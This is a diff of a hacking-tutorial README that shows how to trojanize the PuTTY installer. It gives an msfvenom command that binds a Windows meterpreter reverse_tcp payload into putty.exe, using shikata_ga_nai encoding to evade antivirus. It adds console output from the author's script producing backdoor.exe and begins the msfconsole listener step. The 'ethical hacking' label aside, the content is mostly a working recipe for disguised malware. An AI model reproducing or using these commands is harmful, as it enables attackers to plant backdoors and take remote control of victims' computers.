@@ -9,6 +9,7 @@ download here <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest
 <hr>
 we will link our putty.exe file to our backdoor.
 
+## console
 ```terminal
 msfvenom -a x86 -x /home/samglish/Téléchargements/putty.exe -k -p windows/meterpreter/reverse_tcp lhost=your_Ip_adress lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe 
 ```
@@ -39,6 +40,62 @@ output:
 ```output
 hello.exe: PE32 executable (GUI) Intel 80386, for MS Windows
 ```
+<hr>
+
+## Use my script
+┌─[✗]─[samglish@parrotOS]─[~/Desktop]
+└──╼ $bash testt.sh 
+***********************************************************
+*                   Ethical Hacking                       *
+*                      BACKDOOR                           *
+*                      Samglish                           *
+***********************************************************
+Installing tools...
+------------------------------------------------------------
+***Metasploit-framework***
+Please wait...
+ 
+ Voulez vous creer votre backdoor?
+ 1. Oui
+ 2. Non
+Choix : 1
+votre adresse ip : 172.24.10.4
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 381 (iteration=0)
+x86/shikata_ga_nai succeeded with size 408 (iteration=1)
+x86/shikata_ga_nai succeeded with size 435 (iteration=2)
+x86/shikata_ga_nai chosen with final size 435
+Payload size: 435 bytes
+Saved as: backdoor.exe
+backdoor.exe created
+nous lancons l'exploit
+                                                  
+### cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v6.0.44-dev                          ]
++ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+
+Metasploit tip: Save the current environment with the 
+save command, future console restarts will use this 
+environment again
+
+msf6 > 
+
+<hr>
+
+## exploit with msfconsole
 now we will head to metasploit.
 ```terminal
 msfconsole
